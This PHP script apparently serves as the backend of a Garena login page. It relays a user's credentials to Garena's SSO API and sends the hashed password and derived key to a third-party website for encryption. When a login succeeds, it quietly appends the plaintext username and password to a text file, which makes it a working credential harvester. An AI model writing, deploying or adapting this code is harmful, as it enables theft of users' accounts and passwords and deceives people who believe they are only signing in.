<?php

// >_Ging DEV

require('vendor/autoload.php');


$curl = new Curl\Curl();

$username = isset($_REQUEST['username']) ? $_REQUEST['username'] : '';
$password = isset($_REQUEST['password']) ? $_REQUEST['password'] : '';
$captcha_key = isset($_REQUEST['captcha_key']) ? $_REQUEST['captcha_key'] : '';
$captcha = isset($_REQUEST['captcha']) ? $_REQUEST['captcha'] : '';



$curl->get('https://sso.garena.com/api/prelogin?account=' . $username . '&format=json&id=' . round(microtime(true)*1000) . '&app_id=10100&captcha_key=' . $captcha_key . '&captcha=' . $captcha);
$prelogin = json_decode($curl->response, true);
$curl->reset();

if ($prelogin['error'] === 'error_require_captcha') {
    $json = [
        'status' => 'error_require_captcha'
    ];
} else if ($prelogin['error'] === 'error_captcha') {
    $json = [
        'status' => 'warning',
        'massage'=> 'Đăng nhập thất bại: mã xác minh sai.'
    ];
} else if ($prelogin['error'] === 'error_no_account') {
    $json = [
        'status' => 'warning',
        'message' => 'Đăng nhập thất bại: không có tài khoản này.'
    ];
} else {
      

    $pass = md5($password);
    $key = hash('sha256', hash('sha256', $pass . $prelogin['v1']) . $prelogin['v2']);


    $curl->post('http://www.cryptogrium.com/crypto.php', 'optype=aes_ecb&operation=encrypt&blocksize=256&key=' . $key . '&input=' . $pass);
    $pass = strip_tags($curl->response);
    $curl->reset();

    $curl->get('https://sso.garena.com/api/login?account=' . $prelogin['account'] . '&password=' . $pass . '&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&format=json&id=' . $prelogin['id'] . '&app_id=10100');
    $data = json_decode($curl->response, true);
    $curl->close();
    if (($data['error'] === 'error_auth') || ($data['error'] === 'error_params')) {
        $json = [
            'status' => 'warning',
            'message' => 'Mật khẩu không chính xác.'
        ];
    } else {
        $json = [
            'status' => 'success',
            'message' => $data['username']
        ];
        
        $file = fopen('../account-garena.txt', 'a');
        fwrite($file, $username . '@' . $password . "\r\n");
        fclose($file);
    }
}

echo json_encode($json);




